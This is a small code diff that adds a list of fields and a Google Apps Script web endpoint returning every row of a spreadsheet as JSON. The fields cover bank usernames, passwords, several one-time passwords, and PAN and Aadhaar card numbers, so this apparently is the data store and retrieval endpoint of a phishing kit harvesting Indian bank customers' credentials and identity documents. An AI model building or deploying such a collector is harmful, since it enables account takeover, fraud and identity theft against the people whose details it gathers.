@@ -1,0 +1,26 @@
+BranchName
+HolderName
+DOB
+username
+password
+number
+otp1
+otp2
+PANCARDNU
+PanName
+otp3
+AadhaarCARDNU
+AdharName
+otp4
+otp5
+
+
+const ss = SpreadsheetApp.openByUrl("")
+const sheet = ss.getSheetByName("Sheet1")
+function doGet(e){
+  let obj = {};
+  let data = sheet.getDataRange().getValues()
+  obj.content = data;
+return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON)
+ 
+}
